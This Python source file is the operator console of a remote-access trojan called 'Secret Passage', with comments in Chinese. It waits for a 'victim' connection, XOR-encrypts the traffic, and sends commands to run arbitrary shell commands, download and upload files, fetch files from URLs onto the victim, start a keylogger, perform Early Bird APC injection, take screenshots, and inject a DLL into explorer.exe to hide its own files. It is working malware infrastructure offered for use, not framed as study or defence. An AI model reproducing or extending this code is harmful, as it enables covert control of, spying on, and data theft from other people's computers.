#!/usr/bin/python3
"""
Secret Passage — Server (C2 Console)

功能：
  - 接收 client 連線並發送指令
  - XOR 解密通訊（與 client 共用密鑰）
  - 支援指令：cd, download, upload, get, start, inject, kl_start, screenshot, hide_files, eject_hidden, q

使用方式：
  python server.py
  SP_XOR_KEY=SecretPassage2024 python server.py
  SP_SERVER_IP=0.0.0.0 SP_SERVER_PORT=4444 python server.py
"""

import socket
import json
import base64
import struct
import os
import sys
import time

HOST_IP   = os.environ.get("SP_SERVER_IP",   "127.0.0.1")
HOST_PORT = int(os.environ.get("SP_SERVER_PORT", "12345"))

# 必須與 client 端的 SP_XOR_KEY 相同
XOR_KEY = os.environ.get("SP_XOR_KEY", "SecretPassage2024").encode("utf-8")


# ══════════════════════════════════════════════════════
# XOR 加密層（與 client 共用邏輯）
# ══════════════════════════════════════════════════════

def xor_crypt(data: bytes) -> bytes:
    """XOR 加密/解密"""
    if not XOR_KEY:
        return data
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])


# ══════════════════════════════════════════════════════
# 可靠通訊層（Length-Prefixed JSON + XOR）
# ══════════════════════════════════════════════════════

def recv_all(s, n):
    """確保從 socket 讀取精確的 n 個 bytes"""
    data = bytearray()
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return bytes(data)


def reliable_send(target_socket, data):
    """發送：JSON → XOR 加密 → 加上長度表頭 → 送出"""
    json_data = json.dumps(data).encode("utf-8")
    encrypted = xor_crypt(json_data)
    data_len = struct.pack(">I", len(encrypted))
    target_socket.sendall(data_len + encrypted)


def reliable_recv(target_socket):
    """
    接收：讀表頭 → 讀加密資料 → XOR 解密 → JSON 反序列化
    回傳解析後的 Python 物件，或 None（連線中斷/錯誤）。
    """
    try:
        header = recv_all(target_socket, 4)
        if not header:
            return None
        data_len = struct.unpack(">I", header)[0]

        if data_len > 10_000_000:  # 10 MB 上限
            return None

        data = recv_all(target_socket, data_len)
        if not data:
            return None

        decrypted = xor_crypt(data)
        return json.loads(decrypted.decode("utf-8"))
    except (socket.error, json.JSONDecodeError, UnicodeDecodeError):
        return None


# ══════════════════════════════════════════════════════
# 指令選單
# ══════════════════════════════════════════════════════

BANNER = r"""
  ██████  ██▓███   ██████ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓▓█████
▒██    ▒ ▓██░  ██▒▒██    ▒ ▓█   ▀ ▓██ ▒  ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀
░ ▓██▄   ▓██░ ██▓▒░ ▓██▄   ▒███   ▓██░ ▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒███
  ▒   ██▒▒██▄█▓▒ ▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄
▒██████▒▒▒██▒ ░  ░▒██████▒▒░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒
╚═══════╝ ╚═╝    ╚═══════╝ ╚═════╝ ╚═════╝  ╚═════╝
                 Secret Passage — C2 Console
"""

HELP_TEXT = """
┌─────────────────────────────────────────────────────────────┐
│                       指令說明                              │
├─────────────────────────────────────────────────────────────┤
│  <任意 shell 指令> — 在受害端執行並回傳結果                 │
│  cd <path>         — 切換目錄                               │
│  download <file>   — 從受害端下載檔案（base64 編碼）        │
│  upload   <file>   — 上傳檔案到受害端（base64 編碼）        │
│  get      <url>    — 從 URL 下載檔案到受害端                │
│  start    <prog>   — 在受害端啟動程式                       │
│  kl_start          — 啟動鍵盤記錄器                         │
│  inject   <b64>    — Early Bird APC Injection               │
│  screenshot         — 擷取受害端螢幕截圖（存為 BMP）            │
│  hide_files [dll]  — 注入 hidden.dll 到 explorer.exe        │
│                      隱藏 client.exe / srv.exe 等檔案       │
│  eject_hidden      — 清除隱藏設定（需重啟 Explorer 才完整） │
│  help              — 顯示此說明                             │
│  q                 — 斷線並結束                             │
└─────────────────────────────────────────────────────────────┘
"""


# ══════════════════════════════════════════════════════
# 主伺服器迴圈
# ══════════════════════════════════════════════════════

def handle_download(target, filename):
    """處理下載：接收 client 傳來的 base64 資料並寫入本地檔案"""
    result = reliable_recv(target)
    if result is None:
        print("[!!] Connection lost or protocol error.")
        return False

    if not result.startswith("[!!]"):
        try:
            with open(filename, "wb") as f:
                f.write(base64.b64decode(result.encode("ascii")))
            print(f"[+] File '{filename}' downloaded successfully.")
        except Exception as e:
            print(f"[!!] Failed to write file: {e}")
    else:
        print(result)
    return True


def handle_upload(target, filename):
    """處理上傳：讀取本地檔案 → base64 → 傳給 client"""
    try:
        with open(filename, "rb") as f:
            content = f.read()
            encoded_content = base64.b64encode(content).decode("ascii")
            reliable_send(target, encoded_content)
        print(f"[+] File '{filename}' uploaded to client successfully.")
    except FileNotFoundError:
        failed = f"[!!] File '{filename}' not found on server."
        reliable_send(target, failed)
        print(failed)
    except Exception as e:
        failed = f"[!!] Fail to upload: {e}"
        reliable_send(target, failed)
        print(failed)


def start_server():
    """啟動 C2 Server，等待 client 連線"""
    print(BANNER)
    print(f"[*] XOR key: {'(default)' if XOR_KEY == b'SecretPassage2024' else '(custom)'}")
    print(f"[*] Listening on {HOST_IP}:{HOST_PORT} ...")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST_IP, HOST_PORT))
        s.listen(1)

        target, ip = s.accept()
        with target:
            print(f"[+] Victim connected from: {ip}")
            print(f"[+] Type 'help' for available commands.\n")

            while True:
                try:
                    command = input(f"* Shell#-{ip}: ").strip()
                except (EOFError, KeyboardInterrupt):
                    print("\n[*] Shutting down...")
                    break

                if not command:
                    continue

                reliable_send(target, command)

                if command == 'q':
                    break

                elif command == 'help':
                    print(HELP_TEXT)
                    continue

                elif command.startswith("cd ") and len(command) > 3:
                    continue

                elif command.startswith("download "):
                    filename = command[9:].strip()
                    if not handle_download(target, filename):
                        break

                elif command.startswith("upload "):
                    handle_upload(target, command[7:].strip())

                else:
                    # 所有其他指令（get, start, inject, kl_start, hide_files, eject_hidden, screenshot, shell 指令）
                    result = reliable_recv(target)
                    if result is None:
                        print("[!!] Connection lost.")
                        break

                    # 處理截圖：解析 [IMG]base64[/IMG] 並存檔
                    if isinstance(result, str) and "[IMG]" in result and "[/IMG]" in result:
                        try:
                            start_tag = result.index("[IMG]") + 5
                            end_tag = result.index("[/IMG]")
                            b64_data = result[start_tag:end_tag]
                            img_bytes = base64.b64decode(b64_data)

                            # 存檔
                            ts = time.strftime("%Y%m%d_%H%M%S")
                            screenshot_file = f"screenshot_{ts}.bmp"
                            with open(screenshot_file, "wb") as f:
                                f.write(img_bytes)
                            print(f"[+] Screenshot saved: {screenshot_file} ({len(img_bytes)} bytes)")
                            # 也印出非 base64 的訊息部分
                            prefix = result[:result.index("[IMG]")].strip()
                            if prefix:
                                print(prefix)
                        except Exception as e:
                            print(f"[!!] Failed to save screenshot: {e}")
                            print(result)
                    else:
                        print(result)


if __name__ == "__main__":
    start_server()
